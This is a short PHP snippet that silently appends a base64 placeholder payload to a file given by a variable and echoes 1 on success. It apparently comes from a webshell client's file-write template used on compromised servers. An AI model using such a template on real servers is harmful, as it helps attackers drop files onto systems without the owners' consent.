<?

// DATA = B64PAYLOAD
if($h=@fopen($f,'a'))if(@fwrite($h,'DATA')){@fclose($h);echo 1;};

?>
